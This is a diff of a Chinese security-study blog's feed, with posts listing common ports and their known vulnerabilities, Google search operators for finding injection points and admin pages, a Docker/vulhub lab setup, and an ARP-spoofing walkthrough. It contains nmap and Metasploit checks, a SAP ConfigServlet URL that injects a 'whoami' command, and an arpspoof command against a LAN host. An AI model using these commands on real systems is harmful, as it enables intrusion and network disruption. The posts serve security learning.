     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>20：FTP服务的数据传输端口</p><a id="more"></a><p>21：FTP服务的连接端口，可能存在  弱口令暴力破解<br>22：SSH服务端口，可能存在 弱口令暴力破解 28退格漏洞 OpenSSL漏洞 CVE-2015-8370 cve-2014-0224 cve-2014-3566（nmap -p 443 –script ssl-ccs-injection,ssl-poodle 10.1.21.103）<br>23：Telnet端口，可能存在 弱口令暴力破解<br>25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应  未授权访问<br>43：whois服务端口<br>53：DNS服务端口(TCP/UDP 53)  区域传输漏洞  echo ls 10.1.102.77 | nslookup<br>67/68：DHCP服务端口  DHCP劫持；<br>69：TFTP端口，可能存在弱口令<br>80：HTTP端口<br>110：POP3邮件服务端口，和SMTP的25端口对应<br>111：rpcbind漏洞  nmap -p 111 –script=rpcinfo 192.168.172.129    msf：use auxiliary/scanner/misc/sunrpc_portmapper<br>135：RPC服务<br>137/138： NMB服务<br>139：SMB/CIFS服务  未授权访问：给予public用户高权限 远程代码执行漏洞：CVE-2015-0240<br>143：IMAP协议端口<br>161/162: Snmp服务 弱口令漏洞<br>389：LDAP目录访问协议，有可能存在注入、弱口令  未授权访问<br>443：HTTPS端口  openssl心脏滴血  nmap -sV -p 443 –script ssl-heartbleed.nse  ip<br>445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010 （nmap –script smb-vuln-ms17-010 目标IP） MS17-020 远程代码执行漏洞：CVE-2015-0240<br>512/513/514：Linux R服务 使用rlogin直接登录对方系统；<br>873：Rsync ，可能存在Rsync未授权访问漏洞，本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限<br>1099：RMI，可能存在 RMI反序列化漏洞  远程命令执行（java反序列化，调用rmi方式执行命令）CVE-2011-3556<br>1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露<br>1433：SQL Server对外提供服务端口<br>1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口<br>1521：oracle数据 Oracle TNS Listener远程数据投毒 use scanner/oracle/tnspoison_checker<br>2049：NFS服务端口，可能存在NFS配置不当  未授权访问：未限制IP以及用户权限设置错误<br>2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞<br>2375：Docker端口，可能存在 Docker未授权访问漏洞<br>3306：MySQL数据库端口，可能存在 弱口令暴力破解<br>3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现   Shift粘滞键后门：5次shift后门<br>3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞<br>4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)<br>4848：GlassFish控制台端口，可能存在弱口令<br>5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞  安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）<br>5432：PostGreSQL数据库的端口  CVE-2014-2669<br>5632：PyAnywhere服务端口，可能存在代码执行漏洞  提权控制服务：拒绝服务攻击：<br>5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞  拒绝服务攻击：（CVE-2015-5239）权限提升：（CVE-2013-6886）<br>5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞<br>6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞<br>7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：WeblogicScan.py<br>7180/7183:hadoop<br>8009：tomcat文件读取（cve-2020-1938）<br>8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞  远程命令执行 SQL注入漏洞（CVE-2016-10134）<br>8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，tomcat文件包含漏洞（cve-2020-1938）<br>8088:hadoop组件本地提权漏洞,未授权访问<br>8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞<br>8090：Springboot未授权访问<br>8161：Apache ActiveMQ服务端口，可能存在CVE-2016-3088漏洞，默认口令密码为：admin:admin ，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）<br>9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)<br>9043/9090：WebSphere，可能存在WebSphere反序列化漏洞<br>9080：WebSphere任意文件泄漏：（CVE-2014-0823）<br>9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞  未授权访问；远程命令执行；文件遍历；低版本webshell植入<br>10000：Webmin-Web控制面板，可能存在弱口令<br>10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)<br>11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞  telnet  ip  11211<br>11521：Oracle TNS 数据投毒漏洞   msf: tnspoison_checker<br>17180:hadoop<br>27017：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞   未授权访问；github有攻击代码<br>50000：SAP Management Console服务端口，可能存在 远程命令执行漏洞。<a href="http://10.1.18.122:50000/ctc/servlet/ConfigServlet">http://10.1.18.122:50000/ctc/servlet/ConfigServlet</a>?                        param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=whoami<br>50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞<br>Apache Hadoop远程命令执行</p><p>21,22,23,25,43,53,67,68,69,80,81-89,110,135,137,138,139,143,161,162,389,443,445,<br>465,873,993,995,1080,1099,1158,1352,1433,1434,1521,1863,2049,2100,2181,2375,3128,<br>3306,3389,3690,4750,4848,5000,5432,5632,5900,5901,5984,6379,7001,8009，8069,8080,<br>8081-8089,8161,8888,9001,9043,9080,9090,9200,9300,10000-10002,11211,27017,<br>50000,50070</p>]]></content>
     
@@ -104,7 +110,7 @@
     
     
     
-    <category term="常识" scheme="http://emptybottle.xyz/categories/%E5%B8%B8%E8%AF%86/"/>
+    <category term="端口" scheme="http://emptybottle.xyz/categories/%E7%AB%AF%E5%8F%A3/"/>
     
     
   </entry>
@@ -114,7 +120,7 @@
     <link href="http://emptybottle.xyz/2021/04/09/%E6%AD%8C%E8%AF%AD%E6%B3%95/"/>
     <id>http://emptybottle.xyz/2021/04/09/%E6%AD%8C%E8%AF%AD%E6%B3%95/</id>
     <published>2021-04-09T01:37:00.000Z</published>
-    <updated>2021-04-09T07:35:24.000Z</updated>
+    <updated>2022-05-15T13:01:12.613Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>intitle：关键字</p><a id="more"></a><p>搜索网页标题中含有这些关键字的网页。</p><p>inurl：关键字<br>搜索含有关键字的URL地址。</p><p>site：域名<br>返回域名中所有的URL地址。</p><p>filetype：文件名.后缀名<br>搜索特定的文件。</p><p>Intext: 关键字<br>搜索文本内容包括关键字</p><p>cache：关键字<br>搜索含有关键字内容的cache。</p><p>define：关键字<br>搜索关键字的定义。</p><p>info：关键字<br>搜索指定站点的一些基本信息。</p><p>link：关键字<br>查找与关键字做了链接的URL地址。</p><p>related：URL<br>搜索与指定URL相关的页面。</p><p>组合使用:</p><ol><li><pre><code>  找注入点</code></pre><p>Inurl:php?id=58<br>Inurl:php?id=58 intitle:新闻动态<br>Inurl:php?id=58 intitle:公司<br>Inurl:asp?tid=3 intitle:新闻动态</p></li><li><pre><code>  找后台</code></pre><p>Intitle:管理员登录<br>Admin login.asp|php|aspx|jsp</p></li></ol><p>Intitle:管理员 inurl:login<br>符号<br>-keyword  强制结果不出现该关键字<br>*keyword  模糊查询，强制结果出现此关键字<br>“keyword   强制搜索结果出现此关键字</p>]]></content>
     
@@ -123,7 +129,7 @@
     
     
     
-    <category term="常识" scheme="http://emptybottle.xyz/categories/%E5%B8%B8%E8%AF%86/"/>
+    <category term="搜索语法" scheme="http://emptybottle.xyz/categories/%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/"/>
     
     
   </entry>
@@ -133,7 +139,7 @@
     <link href="http://emptybottle.xyz/2021/04/07/docker%E6%90%AD%E5%BB%BA/"/>
     <id>http://emptybottle.xyz/2021/04/07/docker%E6%90%AD%E5%BB%BA/</id>
     <published>2021-04-07T04:01:00.000Z</published>
-    <updated>2021-04-09T01:26:36.000Z</updated>
+    <updated>2022-05-15T13:08:06.330Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Docker 要求 CentOS 系统的内核版本高于 3.10</p><a id="more"></a><p>uname -r 命令查看你当前的内核版本<br><img src="https://img-blog.csdnimg.cn/20210407115810233.png" alt="版本号"></p><p>1.安装 Docker<br>Yum要最新版本 更新yum<br>yum update</p><p>安装一些必要的系统工具：<br>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</p><p>添加软件源信息：<br>sudo yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p><p>更新yum缓存<br>sudo yum makecache fast</p><p>安装Docker-ce:<br>sudo yum -y install docker-ce</p><p>启动Docker后台服务<br>sudo systemctl start docker<br>测试运行 hello-world</p><p>添加开机自启<br>systemctl start docker<br>systemctl enable docker</p><p>2.安装 Docker-compose<br>curl -L <a href="https://github.com/docker/compose/releases/download/1.22.0/docker-compose-%60uname">https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname</a> -s<code>-</code>uname -m<code> -o /usr/local/bin/docker-compose 这个下载太慢了因为源在国外 可以换成这个源在国内 curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.0/docker-compose-</code>uname -s<code>-</code>uname -m` &gt; /usr/local/bin/docker-compose</p><p>chmod +x /usr/local/bin/docker-compose</p><p>3.安装 vulhub<br>安装git命令<br>yum -y install git </p><p>git -version #验证是否安装成功</p><p>创建一个专门存放环境的文件夹，方便管理<br>mkdir CVE　　</p><p>下载编译vulhub<br>cd /CVE　　#进入靶机管理文件夹，也可以忽略<br>git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a><br>如果太慢的话可以离线下载然后在传到虚拟机就行</p><p>进入vulhub/wordpress/pwnscriptum/目录<br>docker-compose up -d #安装此漏洞环境<br>docker ps #查看运行服务端口</p><p>vulhub使用：<br>进入vulhub具体漏洞目录例如：cd CVE/vulhub/tomcat/tomcat8，<br>构造漏洞环境：docker-compose up -d<br>浏览器访问：127.0.0.1:8080</p><p>因为github访问下载会特别慢  。  这里还有一种方法 ，也可以  离线下载下来放到文件夹就行 。</p>]]></content>
     
@@ -142,7 +148,7 @@
     
     
     
-    <category term="环境" scheme="http://emptybottle.xyz/categories/%E7%8E%AF%E5%A2%83/"/>
+    <category term="工具" scheme="http://emptybottle.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
     
     
   </entry>
@@ -152,7 +158,7 @@
     <link href="http://emptybottle.xyz/2021/04/07/rp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/"/>
     <id>http://emptybottle.xyz/2021/04/07/rp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/</id>
     <published>2021-04-07T03:13:00.000Z</published>
-    <updated>2021-04-09T10:12:10.000Z</updated>
+    <updated>2022-05-15T13:08:14.306Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>受害者 ：Windows 10</p><a id="more"></a><p><img src="https://img-blog.csdnimg.cn/20210407110225464.jpeg" alt="查看Windows10  IP地址"></p><p>攻击者：kali虚拟机<br>1.准备环节<br><img src="https://img-blog.csdnimg.cn/20210407110300645.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="确保在一个网段内"></p><p>虚拟机为net模式 子网ip和受害者在同一个网段192.168.1.0/24</p><p>Arp断网正文：<br>1.查看同一局域网内当前在线的主机ip<br>fping -asg 192.168.1.0/24<br><img src="https://img-blog.csdnimg.cn/20210407110327758.png" alt="同一局域网内的主机 IP找到要攻击的主机"></p><p>2.查看ip网关信息<br><img src="https://img-blog.csdnimg.cn/2021040711040251.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="查看自己网关的信息"></p><p>3.选择受害者ip进行攻击 192.168.1.4受害者ip<br>arpspoof -i eth0 -t 192.168.1.4 192.168.1.1<br><img src="https://img-blog.csdnimg.cn/20210407110426917.jpeg" alt="选择想攻击的IP"></p>]]></content>
     
@@ -161,7 +167,7 @@
     
     
     
-    <category term="kali工具利用" scheme="http://emptybottle.xyz/categories/kali%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8/"/>
+    <category term="笔记" scheme="http://emptybottle.xyz/categories/%E7%AC%94%E8%AE%B0/"/>
     
     
   </entry>
@@ -171,7 +177,7 @@
     <link href="http://emptybottle.xyz/2020/11/11/VMware+kali%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
     <id>http://emptybottle.xyz/2020/11/11/VMware+kali%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
     <published>2020-11-11T12:43:00.000Z</published>
-    <updated>2021-05-10T03:13:38.000Z</updated>
+    <updated>2022-05-15T13:08:24.207Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>相比对于学安全的虚拟机的重要性不用说都知道多重要了吧！！<a id="more"></a></p><p>百度也是各种教程齐全、、</p><p>虚拟机安装教程这里不多提百度都能出来</p><p>百度网盘镜像分享链接放在这里</p><p>kali镜像也包括在内!!!!</p><p>复制这段内容后打开百度网盘App，操作更方便哦。</p><p>链接:<a href="https://pan.baidu.com/s/1elQkD4rVsASygRJSTsxt5Q">https://pan.baidu.com/s/1elQkD4rVsASygRJSTsxt5Q</a> 提取码:u6fz</p>]]></content>
     
@@ -180,8 +186,8 @@
     
     
     
+    <category term="工具" scheme="http://emptybottle.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
     
-    <category term="安全必备" scheme="http://emptybottle.xyz/tags/%E5%AE%89%E5%85%A8%E5%BF%85%E5%A4%87/"/>
     
   </entry>
   
